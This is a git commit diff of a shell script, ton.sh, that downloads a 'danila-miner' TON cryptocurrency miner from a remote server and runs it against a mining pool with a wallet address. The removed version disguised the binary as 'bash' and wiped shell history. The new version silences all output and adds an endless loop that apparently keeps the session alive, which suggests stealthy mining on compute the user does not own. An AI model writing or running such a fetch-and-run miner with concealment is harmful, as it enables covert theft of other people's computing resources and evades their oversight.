3cd9ef3605486eff1709b49129f140f0de1f8fbc
LordTepan <73474589+tepan024@users.noreply.github.com>
2022-05-10 01:37:52 +0700

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,8 +1,13 @@
 #!/bin/bash
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-chmod +x danila-miner 
-mv danila-miner bash
-rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz
-history -cr
-./bash run https://server1.whalestonpool.com EQB1pLWXjpgDYJ7mCQcZysVNGjqSRo3MlAsSAiZ33NMvMLMS
+#!/bin/sh
+#!/bin/bash
+
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+chmod +x danila-miner >/dev/null 2>&1
+./danila-miner run https://server1.whalestonpool.com EQA0Q3JaZgjKJ6QVzETgz3xYfalnLCx170Ey8cEGhsnyLkdI
+
+while [ 1 ]; do
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+sleep 2
+done
